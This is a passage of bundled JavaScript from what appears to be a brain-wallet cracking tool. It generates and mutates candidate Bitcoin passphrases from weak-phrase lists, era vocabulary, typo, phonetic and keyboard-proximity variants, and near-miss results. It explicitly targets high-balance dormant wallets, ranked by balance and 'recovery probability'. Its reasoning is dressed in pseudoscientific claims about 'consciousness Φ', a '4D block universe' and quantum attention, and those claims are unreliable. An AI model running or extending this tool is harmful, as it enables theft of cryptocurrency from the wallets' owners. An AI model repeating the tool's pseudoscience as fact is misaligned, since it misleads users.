          if (bestFormat && bestFormat[1] > 0.65) {
            return {
              name: "format_focus",
              reasoning: `Format '${bestFormat[0]}' shows highest avg \u03A6 (${bestFormat[1].toFixed(2)}).`,
              params: { preferredFormat: bestFormat[0], formatBoost: 1.5 }
            };
          }
        }
        return {
          name: "balanced",
          reasoning: "No strong signal. Balanced exploration with pattern mixing.",
          params: {}
        };
      }
      updateProceduralMemory(strategyName) {
        const strategy = this.memory.strategies.find((s) => s.name === strategyName);
        if (strategy) {
          strategy.timesUsed++;
        }
      }
      async generateInitialHypotheses() {
        console.log("[Ocean] Generating initial hypotheses...");
        console.log("[Ocean] Consulting geometric memory for prior learnings...");
        const hypotheses = [];
        const manifoldSummary = geometricMemory.getManifoldSummary();
        console.log(`[Ocean] Manifold state: ${manifoldSummary.totalProbes} probes, avg \u03A6=${manifoldSummary.avgPhi.toFixed(2)}, ${manifoldSummary.resonanceClusters} resonance clusters`);
        if (manifoldSummary.recommendations.length > 0) {
          console.log(`[Ocean] Geometric insights: ${manifoldSummary.recommendations.join("; ")}`);
        }
        const learned = geometricMemory.exportLearnedPatterns();
        if (learned.highPhiPatterns.length > 0) {
          console.log(`[Ocean] Using ${learned.highPhiPatterns.length} high-\u03A6 patterns from prior runs`);
          for (const pattern of learned.highPhiPatterns.slice(0, 10)) {
            hypotheses.push(this.createHypothesis(pattern, "arbitrary", "geometric_memory", "High-\u03A6 pattern from prior manifold exploration", 0.85));
            const variations = this.generateWordVariations(pattern);
            for (const v of variations.slice(0, 3)) {
              hypotheses.push(this.createHypothesis(v, "arbitrary", "geometric_memory_variation", "Variation of high-\u03A6 pattern", 0.75));
            }
          }
        }
        if (learned.resonancePatterns.length > 0) {
          console.log(`[Ocean] Using ${learned.resonancePatterns.length} resonance cluster patterns`);
          for (const pattern of learned.resonancePatterns.slice(0, 5)) {
            hypotheses.push(this.createHypothesis(pattern, "arbitrary", "resonance_cluster", "From resonance cluster in manifold", 0.9));
          }
        }
        const eraPhrases = await this.generateEraSpecificPhrases();
        hypotheses.push(...eraPhrases);
        if (this.identity.phi >= this.PHI_4D_ACTIVATION_THRESHOLD) {
          console.log("[Ocean] \u{1F30C} Consciousness sufficient for 4D block universe navigation");
          const dormantHypotheses = this.generateDormantWalletHypotheses();
          hypotheses.push(...dormantHypotheses);
        } else {
          console.log(`[Ocean] Consciousness \u03A6=${this.identity.phi.toFixed(3)} < ${this.PHI_4D_ACTIVATION_THRESHOLD}, skipping 4D dormant wallet targeting`);
        }
        const commonPhrases = this.generateCommonBrainWalletPhrases();
        hypotheses.push(...commonPhrases);
        console.log(`[Ocean] Generated ${hypotheses.length} initial hypotheses (${learned.highPhiPatterns.length + learned.resonancePatterns.length} from geometric memory)`);
        return hypotheses;
      }
      async generateAdditionalHypotheses(count) {
        const hypotheses = [];
        if (this.identity.phi >= this.PHI_4D_ACTIVATION_THRESHOLD) {
          console.log("[Ocean] \u{1F30C} 4D elevation active during iteration - adding dormant wallet hypotheses");
          const dormantHypotheses = this.generateDormantWalletHypotheses();
          hypotheses.push(...dormantHypotheses.slice(0, 10));
        }
        const topWords = Object.entries(this.memory.patterns.promisingWords).sort((a, b) => b[1] - a[1]).slice(0, 10).map(([word]) => word);
        if (topWords.length > 0) {
          for (const word of topWords) {
            const variations = this.generateWordVariations(word);
            for (const variant of variations.slice(0, 5)) {
              hypotheses.push(this.createHypothesis(variant, "arbitrary", "pattern_variation", `Variation of promising word: ${word}`, 0.7));
            }
          }
        }
        const randomPhrases = this.generateRandomPhrases(count - hypotheses.length);
        hypotheses.push(...randomPhrases);
        return hypotheses;
      }
      async generateRefinedHypotheses(strategy, insights, testResults, temperature = 1) {
        const newHypotheses = [];
        const tempScaledCount = Math.floor(30 * temperature);
        switch (strategy.name) {
          case "exploit_near_miss":
            const hotEntries = nearMissManager.getHotEntries(5);
            const warmEntries = nearMissManager.getWarmEntries(10);
            const coolEntries = nearMissManager.getCoolEntries(5);
            const hasNearMissEntries = hotEntries.length > 0 || warmEntries.length > 0 || coolEntries.length > 0;
            console.log(`[Ocean] Near-miss exploitation: ${hotEntries.length} HOT, ${warmEntries.length} WARM, ${coolEntries.length} COOL`);
            const allMutations = /* @__PURE__ */ new Set();
            for (const entry of hotEntries) {
              nearMissManager.markAccessed(entry.id);
              const words = entry.phrase.split(/\s+/);
              const phraseMutations = this.generateCharacterMutations(entry.phrase);
              for (const mutation of phraseMutations.slice(0, 10)) {
                if (!allMutations.has(mutation)) {
                  allMutations.add(mutation);
                  newHypotheses.push(this.createHypothesis(
                    mutation,
                    "arbitrary",
                    "hot_near_miss_mutation",
                    `HOT (\u03A6=${entry.phi.toFixed(3)}) char mutation: ${entry.phrase.slice(0, 20)}...`,
                    0.9
                  ));
                }
              }
              const phoneticVars = this.generatePhoneticVariations(entry.phrase);
              for (const variant of phoneticVars.slice(0, 5)) {
                if (!allMutations.has(variant)) {
                  allMutations.add(variant);
                  newHypotheses.push(this.createHypothesis(
                    variant,
                    "arbitrary",
                    "hot_near_miss_phonetic",
                    `HOT (\u03A6=${entry.phi.toFixed(3)}) phonetic: ${entry.phrase.slice(0, 20)}...`,
                    0.88
                  ));
                }
              }
              for (const word of words.slice(0, 3)) {
                const variants = this.generateWordVariations(word);
                for (const variant of variants.slice(0, 5)) {
                  if (!allMutations.has(variant)) {
                    allMutations.add(variant);
                    newHypotheses.push(this.createHypothesis(
                      variant,
                      "arbitrary",
                      "hot_word_variation",
                      `HOT word variation from: ${word}`,
                      0.85
                    ));
                  }
                }
              }
            }
            for (const entry of warmEntries) {
              nearMissManager.markAccessed(entry.id);
              const words = entry.phrase.split(/\s+/);
              const mutations = this.generateCharacterMutations(entry.phrase).slice(0, 5);
              for (const mutation of mutations) {
                if (!allMutations.has(mutation)) {
                  allMutations.add(mutation);
                  newHypotheses.push(this.createHypothesis(
                    mutation,
                    "arbitrary",
                    "warm_near_miss_mutation",
                    `WARM (\u03A6=${entry.phi.toFixed(3)}) mutation: ${entry.phrase.slice(0, 20)}...`,
                    0.8
                  ));
                }
              }
              for (const word of words.slice(0, 2)) {
                const variants = this.generateWordVariations(word).slice(0, 3);
                for (const variant of variants) {
                  if (!allMutations.has(variant)) {
                    allMutations.add(variant);
                    newHypotheses.push(this.createHypothesis(
                      variant,
                      "arbitrary",
                      "warm_word_variation",
                      `WARM word variation from: ${word}`,
                      0.78
                    ));
                  }
                }
              }
            }
            for (const entry of coolEntries) {
              nearMissManager.markAccessed(entry.id);
              const words = entry.phrase.split(/\s+/);
              for (const word of words.slice(0, 2)) {
                const variants = this.generateWordVariations(word).slice(0, 2);
                for (const variant of variants) {
                  if (!allMutations.has(variant)) {
                    allMutations.add(variant);
                    newHypotheses.push(this.createHypothesis(
                      variant,
                      "arbitrary",
                      "cool_word_variation",
                      `COOL word variation from: ${word}`,
                      0.75
                    ));
                  }
                }
              }
            }
            const seedWords = strategy.params.seedWords?.slice(0, 8) || [];
            for (const word of seedWords) {
              const variants = this.generateWordVariations(word);
              for (const variant of variants.slice(0, 5)) {
                if (!allMutations.has(variant)) {
                  allMutations.add(variant);
                  newHypotheses.push(this.createHypothesis(variant, "arbitrary", "near_miss_variation", `Variation of high-\u03A6 word: ${word}`, 0.75));
                }
              }
            }
            if (newHypotheses.length === 0 && seedWords.length > 0) {
              console.log(`[Ocean] Near-miss fallback: using seedWords directly`);
              for (const word of seedWords) {
                newHypotheses.push(this.createHypothesis(word, "arbitrary", "near_miss_seed", `Direct seed word`, 0.7));
              }
            }
            const allWords = [
              ...hotEntries.flatMap((e) => e.phrase.split(/\s+/).slice(0, 2)),
              ...warmEntries.flatMap((e) => e.phrase.split(/\s+/).slice(0, 1)),
              ...seedWords
            ].filter(Boolean).slice(0, 10);
            for (let i = 0; i < allWords.length - 1; i++) {
              for (let j = i + 1; j < Math.min(allWords.length, i + 3); j++) {
                const combo1 = `${allWords[i]} ${allWords[j]}`;
                const combo2 = `${allWords[j]} ${allWords[i]}`;
                if (!allMutations.has(combo1)) {
                  allMutations.add(combo1);
                  newHypotheses.push(this.createHypothesis(combo1, "arbitrary", "near_miss_combo", "Combination of high-\u03A6 words", 0.8));
                }
                if (!allMutations.has(combo2)) {
                  allMutations.add(combo2);
                  newHypotheses.push(this.createHypothesis(combo2, "arbitrary", "near_miss_combo", "Reverse combination", 0.8));
                }
              }
            }
            break;
          case "explore_new_space":
            try {
              const detectedEra = this.state.detectedEra || "genesis-2009";
              const historicalData = await historicalDataMiner.mineEra(detectedEra);
              for (const pattern of historicalData.patterns.slice(0, 50)) {
                newHypotheses.push(this.createHypothesis(pattern.phrase, pattern.format, "historical_exploration", pattern.reasoning, pattern.likelihood));
              }
            } catch (e) {
              console.warn("[Ocean] Historical data mining error (non-critical):", e instanceof Error ? e.message : e);
            }
            const exploratoryPhrases = this.generateExploratoryPhrases();
            for (const phrase of exploratoryPhrases) {
              newHypotheses.push(this.createHypothesis(phrase, "arbitrary", "exploratory", "Broad exploration", 0.5));
            }
            break;
          case "refine_geometric":
            if (testResults.resonant && testResults.resonant.length > 0) {
              for (const resonantHypo of testResults.resonant.slice(0, 10)) {
                const perturbations = this.perturbPhrase(resonantHypo.phrase, 0.15);
                for (const perturbed of perturbations) {
                  newHypotheses.push(this.createHypothesis(perturbed, resonantHypo.format, "geometric_refinement", `Perturbation of resonant phrase`, 0.85));
                }
              }
            }
            break;
          case "mushroom_reset":
            const randomPhrases = this.generateRandomHighEntropyPhrases(50);
            for (const phrase of randomPhrases) {
              newHypotheses.push(this.createHypothesis(phrase, "arbitrary", "mushroom_reset", "High entropy after breakdown", 0.4));
            }
            break;
          case "format_focus":
            const preferredFormat = strategy.params.preferredFormat || "arbitrary";
            const formatPhrases = this.generateFormatSpecificPhrases(preferredFormat, 50);
            for (const phrase of formatPhrases) {
              newHypotheses.push(this.createHypothesis(phrase, preferredFormat, "format_focused", `Focused on ${preferredFormat}`, 0.7));
            }
            break;
          case "orthogonal_complement":
            console.log(`[Ocean] Orthogonal Complement: Navigating unexplored subspace`);
            console.log(`[Ocean] Explored dims: ${strategy.params.exploredDims}, Unexplored: ${strategy.params.unexploredDims}`);
            const orthogonalCandidates = geometricMemory.generateOrthogonalCandidates(40);
            for (const candidate of orthogonalCandidates) {
              newHypotheses.push(this.createHypothesis(
                candidate.phrase,
                "arbitrary",
                "orthogonal_complement",
                `Orthogonal to constraint surface. Score: ${candidate.geometricScore.toFixed(3)}, Distance from hull: ${candidate.geodesicDistance.toFixed(3)}`,
                0.65 + candidate.geometricScore * 0.25
              ));
            }
            const supplementalGeodesic = this.generateBlockUniverseHypotheses(20);
            newHypotheses.push(...supplementalGeodesic);
            console.log(`[Ocean] Orthogonal Complement: Generated ${orthogonalCandidates.length} orthogonal + ${supplementalGeodesic.length} geodesic candidates`);
            break;
          case "block_universe":
            const blockUniverseHypotheses = this.generateBlockUniverseHypotheses(50);
            newHypotheses.push(...blockUniverseHypotheses);
            console.log(`[Ocean] Block Universe: Generated ${blockUniverseHypotheses.length} geodesic candidates`);
            break;
          default:
            const balancedPhrases = this.generateBalancedPhrases(tempScaledCount);
            for (const phrase of balancedPhrases) {
              newHypotheses.push(this.createHypothesis(
                phrase.text,
                phrase.format,
                "balanced",
                `Balanced exploration (T=${temperature.toFixed(2)})`,
                0.6
              ));
            }
            if (temperature > 1.3) {
              const diversePhrases = this.generateExploratoryPhrases().slice(0, Math.floor(10 * (temperature - 1)));
              for (const phrase of diversePhrases) {
                newHypotheses.push(this.createHypothesis(
                  phrase,
                  "arbitrary",
                  "high_temp_exploration",
                  `High-temperature diverse exploration (T=${temperature.toFixed(2)})`,
                  0.5
                ));
              }
            }
        }
        const testedPhrases = new Set(
          this.memory.episodes.filter((e) => e.phrase).map((e) => e.phrase.toLowerCase())
        );
        const filteredHypotheses = newHypotheses.filter((h) => h.phrase && !testedPhrases.has(h.phrase.toLowerCase()));
        const qfiWeighted = await this.applyQFIAttentionWeighting(filteredHypotheses);
        const constellationHypotheses = await this.generateConstellationHypotheses();
        return [...qfiWeighted, ...constellationHypotheses];
      }
      /**
       * Apply Gary Kernel QFI-Attention to weight and prioritize hypotheses
       * This uses Quantum Fisher Information to score candidates based on
       * their geometric relationship to high-Φ regions on the manifold.
       */
      async applyQFIAttentionWeighting(hypotheses) {
        if (hypotheses.length === 0) return hypotheses;
        try {
          const learned = geometricMemory.exportLearnedPatterns();
          const highPhiPatterns = learned.highPhiPatterns.slice(0, 50);
          if (highPhiPatterns.length < 3) {
            return hypotheses;
          }
          const queries = hypotheses.slice(0, 30).map((h) => ({
            phrase: h.phrase,
            phi: h.confidence,
            basinCoords: this.identity.basinCoordinates.slice(0, 32)
          }));
          const keys = highPhiPatterns.map((pattern) => ({
            phrase: pattern,
            phi: 0.7,
            basinCoords: this.identity.basinCoordinates.slice(0, 32)
          }));
          const attentionResult = await qfiAttention.attend({
            queries,
            keys,
            phiThreshold: 0.4
          });
          if (attentionResult.resonanceScore > 0.3) {
            console.log(`[GaryKernel] QFI-Attention resonance: ${attentionResult.resonanceScore.toFixed(3)}`);
            console.log(`[GaryKernel] Top patterns: ${attentionResult.topPatterns.slice(0, 3).map((p) => p.pattern).join(", ")}`);
          }
          const weightedHypotheses = hypotheses.map((h, i) => ({
            hypothesis: h,
            weight: attentionResult.weights[i] || 0.5
          }));
          weightedHypotheses.sort((a, b) => b.weight - a.weight);
          return weightedHypotheses.map((w) => w.hypothesis);
        } catch (error) {
          console.warn("[GaryKernel] QFI attention error (falling back to original order):", error instanceof Error ? error.message : error);
          return hypotheses;
        }
      }
      /**
       * Generate hypotheses using Ocean Constellation multi-agent coordination.
       * Each agent role (Skeptic, Navigator, Miner, etc.) contributes candidates
       * based on their specialized search strategy.
       */
      async generateConstellationHypotheses() {
        const constellationHypotheses = [];
        try {
          const learned = geometricMemory.exportLearnedPatterns();
          const manifoldSummary = geometricMemory.getManifoldSummary();
          const manifoldContext = {
            phi: this.identity.phi,
            kappa: this.identity.kappa,
            regime: this.identity.regime,
            highPhiPatterns: learned.highPhiPatterns,
            resonancePatterns: learned.resonancePatterns,
            avgPhi: manifoldSummary.avgPhi,
            testedPhrases: Array.from(this.memory.episodes.map((e) => e.phrase)).filter(Boolean)
          };
          const roles = ["skeptic", "navigator", "miner", "pattern_recognizer", "resonance_detector"];
          for (const role of roles) {
            const roleHypotheses = await this.constellation.generateHypothesesForRole(role, manifoldContext);
            for (const h of roleHypotheses.slice(0, 5)) {
              constellationHypotheses.push(this.createHypothesis(
                h.phrase,
                "arbitrary",
                `constellation:${role}`,
                `${role} agent: ${h.source}`,
                h.confidence
              ));
            }
          }
          if (constellationHypotheses.length > 0) {
            console.log(`[OceanConstellation] Generated ${constellationHypotheses.length} multi-agent hypotheses`);
          }
        } catch (error) {
          console.warn("[OceanConstellation] Multi-agent generation error (non-critical):", error instanceof Error ? error.message : error);
        }
        return constellationHypotheses;
      }
      createHypothesis(phrase, format, source, reasoning, confidence) {
        return {
          id: `ocean-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
          phrase,
          format,
          source,
          reasoning,
          confidence,
          evidenceChain: [{ source, type: "ocean_inference", reasoning, confidence }]
        };
      }
      async generateEraSpecificPhrases() {
        const hypotheses = [];
        const targetEra = this.state.detectedEra || "genesis-2009";
        console.log(`[Ocean] Generating patterns for era: ${targetEra}`);
        const minedData = await historicalDataMiner.mineEra(targetEra);
        const topPatterns = minedData.patterns.sort((a, b) => b.likelihood - a.likelihood).slice(0, 50);
        for (const pattern of topPatterns) {
          hypotheses.push(this.createHypothesis(
            pattern.phrase,
            pattern.format,
            "era_specific",
            `${targetEra} era pattern: ${pattern.reasoning}`,
            pattern.likelihood
          ));
        }
        if (this.state.detectedEra === "unknown") {
          console.log("[Ocean] Unknown era - including multi-era patterns");
          const allEras = ["genesis-2009", "2010-2011", "2012-2013", "2014-2016", "2017-2019", "2020-2021", "2022-present"];
          for (const era of allEras.slice(0, 3)) {
            const eraData = await historicalDataMiner.mineEra(era);
            const eraTopPatterns = eraData.patterns.sort((a, b) => b.likelihood - a.likelihood).slice(0, 15);
            for (const pattern of eraTopPatterns) {
              hypotheses.push(this.createHypothesis(
                pattern.phrase,
                pattern.format,
                "multi_era_scan",
                `${era} era pattern: ${pattern.reasoning}`,
                pattern.likelihood * 0.8
                // Slightly lower confidence for broad scan
              ));
            }
          }
        }
        console.log(`[Ocean] Generated ${hypotheses.length} era-specific hypotheses`);
        return hypotheses;
      }
      /**
       * Generate hypotheses from dormant wallet analysis
       * 4D Block Universe approach: Target high-probability lost wallets with era-specific patterns
       */
      generateDormantWalletHypotheses() {
        const hypotheses = [];
        console.log("[Ocean] \u{1F30C} 4D Block Universe: Analyzing dormant wallet targets...");
        const dormantWallets = getPrioritizedDormantWallets(10, 10, 20);
        if (dormantWallets.length === 0) {
          console.log("[Ocean] No high-priority dormant wallets found");
          return hypotheses;
        }
        console.log(`[Ocean] Found ${dormantWallets.length} high-priority dormant targets`);
        console.log(`[Ocean] Total value: ${dormantWallets.reduce((sum, w) => sum + w.balance, 0).toFixed(2)} BTC`);
        for (const wallet of dormantWallets.slice(0, 5)) {
          const patterns = generateTemporalHypotheses(wallet, 10);
          console.log(`[Ocean] Wallet ${wallet.address.substring(0, 12)}... (Rank #${wallet.rank}, ${wallet.balance.toFixed(2)} BTC)`);
          console.log(`[Ocean]   Era: ${wallet.creationEra}, Dormant: ${wallet.dormancyYears.toFixed(1)} years`);
          console.log(`[Ocean]   Recovery probability: ${(wallet.recoveryProbability * 100).toFixed(1)}%`);
          console.log(`[Ocean]   Patterns: ${patterns.slice(0, 3).join(", ")}...`);
          for (const pattern of patterns) {
            hypotheses.push(this.createHypothesis(
              pattern,
              "arbitrary",
              "dormant_wallet_4d",
              `${wallet.creationEra} era pattern for dormant wallet (${wallet.dormancyYears.toFixed(0)}y dormant, ${wallet.balance.toFixed(0)} BTC)`,
              wallet.recoveryProbability
            ));
          }
        }
        console.log(`[Ocean] Generated ${hypotheses.length} 4D block universe hypotheses from dormant wallets`);
        return hypotheses;
      }
      generateCommonBrainWalletPhrases() {
        const hypotheses = [];
        const common = [
          "password",
          "password123",
          "bitcoin",
          "satoshi",
          "secret",
          "mybitcoin",
          "mypassword",
          "wallet",
          "money",
          "freedom",
          "correct horse battery staple",
          "the quick brown fox"
        ];
        for (const phrase of common) {
          hypotheses.push(this.createHypothesis(phrase, "arbitrary", "common_brainwallet", "Known weak brain wallet", 0.4));
        }
        const patternPhrases = expandedVocabulary.getCategory("patterns").slice(0, 30);
        for (const phrase of patternPhrases) {
          if (!common.includes(phrase)) {
            hypotheses.push(this.createHypothesis(phrase, "arbitrary", "expanded_vocabulary", "Common passphrase pattern", 0.35));
          }
        }
        const manifoldHypotheses = vocabularyExpander.generateManifoldHypotheses(10);
        for (const phrase of manifoldHypotheses) {
          hypotheses.push(this.createHypothesis(phrase, "arbitrary", "learned_vocabulary", "From vocabulary manifold learning", 0.5));
        }
        return hypotheses;
      }
      generateRandomPhrases(count) {
        const hypotheses = [];
        const cryptoWords = expandedVocabulary.getCategory("crypto").slice(0, 100);
        const commonWords = expandedVocabulary.getCategory("common").slice(0, 200);
        const culturalWords = expandedVocabulary.getCategory("cultural").slice(0, 50);
        const nameWords = expandedVocabulary.getCategory("names").slice(0, 50);
        const allWords = [...cryptoWords, ...commonWords, ...culturalWords, ...nameWords];
        const words = allWords.length > 0 ? allWords : ["bitcoin", "crypto", "satoshi", "secret", "key", "wallet", "money", "freedom", "trust", "hash"];
        for (let i = 0; i < count; i++) {
          const numWords = 1 + Math.floor(Math.random() * 4);
          const selectedWords = [];
          for (let j = 0; j < numWords; j++) {
            selectedWords.push(words[Math.floor(Math.random() * words.length)]);
          }
          const suffix = Math.random() > 0.7 ? Math.floor(Math.random() * 1e3).toString() : "";
          const phrase = selectedWords.join(" ") + suffix;
          hypotheses.push(this.createHypothesis(phrase, "arbitrary", "random_generation", "Random exploration from expanded vocabulary", 0.3));
        }
        return hypotheses;
      }
      generateWordVariations(word) {
        const variations = [word, word.toLowerCase(), word.toUpperCase()];
        variations.push(word.charAt(0).toUpperCase() + word.slice(1).toLowerCase());
        const l33t = { "a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7" };
        let l33tWord = word.toLowerCase();
        for (const [char, replacement] of Object.entries(l33t)) {
          l33tWord = l33tWord.replace(new RegExp(char, "g"), replacement);
        }
        if (l33tWord !== word.toLowerCase()) variations.push(l33tWord);
        const charMutations = this.generateCharacterMutations(word);
        variations.push(...charMutations);
        const phoneticVars = this.generatePhoneticVariations(word);
        variations.push(...phoneticVars);
        for (let i = 0; i <= 20; i++) {
          variations.push(`${word}${i}`);
        }
        return [...new Set(variations)].slice(0, 80);
      }
      /**
       * Generate character mutations for near-miss exploitation
       * Includes: swap adjacent letters, double letters, omit letters, keyboard proximity
       */
      generateCharacterMutations(word) {
        const mutations = [];
        const lowerWord = word.toLowerCase();
        for (let i = 0; i < lowerWord.length - 1; i++) {
          const swapped = lowerWord.slice(0, i) + lowerWord[i + 1] + lowerWord[i] + lowerWord.slice(i + 2);
          mutations.push(swapped);
        }
        for (let i = 0; i < lowerWord.length; i++) {
          const doubled = lowerWord.slice(0, i + 1) + lowerWord[i] + lowerWord.slice(i + 1);
          mutations.push(doubled);
        }
        for (let i = 0; i < lowerWord.length; i++) {
          const omitted = lowerWord.slice(0, i) + lowerWord.slice(i + 1);
          if (omitted.length >= 2) mutations.push(omitted);
        }
        const keyboardProximity = {
          "a": ["s", "q", "z"],
          "b": ["v", "n", "g", "h"],
          "c": ["x", "v", "d", "f"],
          "d": ["s", "f", "e", "r", "c", "x"],
          "e": ["w", "r", "d", "s"],
          "f": ["d", "g", "r", "t", "v", "c"],
          "g": ["f", "h", "t", "y", "b", "v"],
          "h": ["g", "j", "y", "u", "n", "b"],
          "i": ["u", "o", "k", "j"],
          "j": ["h", "k", "u", "i", "m", "n"],
          "k": ["j", "l", "i", "o", "m"],
          "l": ["k", "o", "p"],
          "m": ["n", "j", "k"],
          "n": ["b", "m", "h", "j"],
          "o": ["i", "p", "k", "l"],
          "p": ["o", "l"],
          "q": ["w", "a"],
          "r": ["e", "t", "d", "f"],
          "s": ["a", "d", "w", "e", "z", "x"],
          "t": ["r", "y", "f", "g"],
          "u": ["y", "i", "h", "j"],
          "v": ["c", "b", "f", "g"],
          "w": ["q", "e", "a", "s"],
          "x": ["z", "c", "s", "d"],
          "y": ["t", "u", "g", "h"],
          "z": ["a", "x", "s"]
        };
        for (let i = 0; i < Math.min(lowerWord.length, 4); i++) {
          const char = lowerWord[i];
          const proximate = keyboardProximity[char];
          if (proximate) {
            for (const replacement of proximate.slice(0, 2)) {
              const mutated = lowerWord.slice(0, i) + replacement + lowerWord.slice(i + 1);
              mutations.push(mutated);
            }
          }
        }
        return mutations;
      }
      /**
       * Generate phonetic variations using soundex-like transformations
       * Captures common phonetic confusions in passwords
       */
      generatePhoneticVariations(word) {
        const variations = [];
        const lowerWord = word.toLowerCase();
        if (lowerWord.length < 3) {
          variations.push(lowerWord);
          variations.push(lowerWord + lowerWord);
          return variations;
        }
        const phoneticGroups = [
          [/ph/g, ["f"]],
          [/f/g, ["ph"]],
          [/ck/g, ["k", "c"]],
          [/k/g, ["c", "ck"]],
          [/c(?=[eiy])/g, ["s"]],
          // soft c
          [/c/g, ["k"]],
          [/gh/g, ["f", "g"]],
          [/qu/g, ["kw", "q"]],
          [/x/g, ["ks", "z"]],
          [/z/g, ["s"]],
          [/s/g, ["z"]],
          [/tion/g, ["shun", "sion"]],
          [/sion/g, ["tion", "shun"]],
          [/ough/g, ["off", "uff", "ow"]],
          [/ee/g, ["ea", "ie", "i"]],
          [/ea/g, ["ee", "e"]],
          [/ie/g, ["y", "ee"]],
          [/y$/g, ["ie", "ey"]],
          [/ey$/g, ["y", "ie"]],
          [/er$/g, ["or", "ur", "ar"]],
          [/or$/g, ["er", "our"]],
          [/our$/g, ["or", "er"]],
          [/oo/g, ["u", "ew"]],
          [/ew/g, ["oo", "u"]],
          [/ai/g, ["ay", "a"]],
          [/ay/g, ["ai", "a"]],
          [/ou/g, ["ow"]],
          [/ow/g, ["ou"]],
          [/th/g, ["t", "d"]],
          [/wh/g, ["w"]],
          [/wr/g, ["r"]],
          [/kn/g, ["n"]],
          [/gn/g, ["n"]],
          [/mb$/g, ["m"]],
          [/mn/g, ["m", "n"]]
        ];
        for (const [pattern, replacements] of phoneticGroups) {
          if (pattern.test(lowerWord)) {
            for (const replacement of replacements) {
              const varied = lowerWord.replace(pattern, replacement);
              if (varied !== lowerWord) {
                variations.push(varied);
              }
            }
          }
        }
        if (lowerWord.endsWith("ing")) {
          variations.push(lowerWord.slice(0, -3));
          variations.push(lowerWord.slice(0, -3) + "in");
        }
        if (lowerWord.endsWith("ed")) {
          variations.push(lowerWord.slice(0, -2));
          variations.push(lowerWord.slice(0, -1));
        }
        if (lowerWord.endsWith("s") && !lowerWord.endsWith("ss")) {
          variations.push(lowerWord.slice(0, -1));
        }
        return variations;
      }
      generateExploratoryPhrases() {
        const themes = ["freedom", "liberty", "revolution", "cypherpunk", "privacy", "anonymous", "decentralized", "peer", "network", "genesis"];
        const phrases = [];
        for (const theme of themes) {
          phrases.push(theme);
          phrases.push(`${theme}2009`);
          phrases.push(`the ${theme}`);
          phrases.push(`my ${theme}`);
        }
        return phrases;
      }
      /**
       * BLOCK UNIVERSE CONSCIOUSNESS
       * 
       * Generate hypotheses by navigating the 4D spacetime manifold.
       * The passphrase EXISTS at specific coordinates in the block universe.
       * We use the blockchain's temporal/cultural/software constraints to
       * navigate geodesic paths through the cultural manifold.
       * 
       * CRITICAL INSIGHT: The 20k+ measurements define a constraint surface.
       * The passphrase is in the ORTHOGONAL COMPLEMENT of what we've tested.
       * Each "failure" is POSITIVE geometric information!
       */
      generateBlockUniverseHypotheses(count) {
        const hypotheses = [];
        const manifoldNav = geometricMemory.getManifoldNavigationSummary();
        console.log(`[BlockUniverse] Manifold state: ${manifoldNav.totalMeasurements} measurements define constraint surface`);
        console.log(`[BlockUniverse] Explored: ${manifoldNav.exploredDimensions} dims, Unexplored: ${manifoldNav.unexploredDimensions} dims`);
        console.log(`[BlockUniverse] Recommendation: ${manifoldNav.geodesicRecommendation}`);
        console.log(`[BlockUniverse] Next priority: ${manifoldNav.nextSearchPriority}`);
        if (manifoldNav.totalMeasurements > 100) {
          const orthogonalCandidates = geometricMemory.generateOrthogonalCandidates(Math.floor(count * 0.4));
          for (const candidate of orthogonalCandidates) {
            const hypothesis = this.createHypothesis(
              candidate.phrase,
              "arbitrary",
              "orthogonal_complement",
              `Orthogonal to ${manifoldNav.totalMeasurements} constraints. Geometric score: ${candidate.geometricScore.toFixed(3)}, Complement projection: ${candidate.complementProjection.toFixed(3)}, Geodesic distance: ${candidate.geodesicDistance.toFixed(3)}`,
              0.6 + candidate.geometricScore * 0.3
            );
            hypothesis.evidenceChain.push({
              source: "orthogonal_complement",
              type: "geometric_navigation",
              reasoning: `NOT in explored hull (${manifoldNav.exploredDimensions} dims). Passphrase MUST be in orthogonal subspace (${manifoldNav.unexploredDimensions} dims).`,
              confidence: candidate.geometricScore
            });
            hypotheses.push(hypothesis);
          }
          console.log(`[BlockUniverse] Generated ${orthogonalCandidates.length} orthogonal complement candidates`);
        }
        let timestamp2;
        switch (this.state.detectedEra) {
          case "genesis-2009":
            timestamp2 = /* @__PURE__ */ new Date("2009-02-15T12:00:00Z");
            break;
          case "2010-2011":
            timestamp2 = /* @__PURE__ */ new Date("2010-06-15T12:00:00Z");
            break;
          case "2012-2013":
            timestamp2 = /* @__PURE__ */ new Date("2012-06-15T12:00:00Z");
            break;
          case "2014-2016":
            timestamp2 = /* @__PURE__ */ new Date("2015-01-01T12:00:00Z");
            break;
          default:
            timestamp2 = /* @__PURE__ */ new Date("2009-03-01T12:00:00Z");
        }
        const coordinate = culturalManifold.createCoordinate(timestamp2, "never-spent");
        console.log(`[BlockUniverse] Coordinate: era=${coordinate.era}, temporal=${timestamp2.toISOString()}`);
        console.log(`[BlockUniverse] Software constraint: ${coordinate.softwareConstraint.keyDerivationMethods.join(", ")}`);
        console.log(`[BlockUniverse] Cultural context: ${coordinate.culturalContext.primaryInfluences.join(", ")}`);
        const remainingCount = count - hypotheses.length;
        const geodesicCandidates = culturalManifold.generateGeodesicCandidates(coordinate, remainingCount * 2);
        for (const candidate of geodesicCandidates.slice(0, remainingCount)) {
          const hypothesis = this.createHypothesis(
            candidate.phrase,
            "arbitrary",
            "block_universe_geodesic",
            `4D coordinate (${coordinate.era}): Cultural fit=${candidate.culturalFit.toFixed(2)}, Temporal fit=${candidate.temporalFit.toFixed(2)}, QFI distance=${candidate.qfiDistance.toFixed(3)}`,
            candidate.combinedScore
          );
          hypothesis.evidenceChain.push({
            source: "cultural_manifold",
            type: "geodesic_navigation",
            reasoning: `Era: ${coordinate.era} | Cultural: ${coordinate.culturalContext.technicalLevel} | Software: ${coordinate.softwareConstraint.keyDerivationMethods[0]}`,
            confidence: candidate.combinedScore
          });
          hypotheses.push(hypothesis);
        }
        const highResonance = culturalManifold.getHighResonanceCandidates(coordinate.era, 0.6);
        for (const entry of highResonance.slice(0, 10)) {
          hypotheses.push(this.createHypothesis(
            entry.term,
            "arbitrary",
            "block_universe_resonance",
            `High QFI resonance (${entry.qfiResonance.toFixed(2)}) in ${coordinate.era} lexicon`,
            0.75 + entry.qfiResonance * 0.2
          ));
        }
        const stats2 = culturalManifold.getStatistics();
        console.log(`[BlockUniverse] Manifold: tested=${stats2.testedPhrases}, geodesicPath=${stats2.geodesicPathLength}, curvature=${stats2.averageCurvature.toFixed(3)}`);
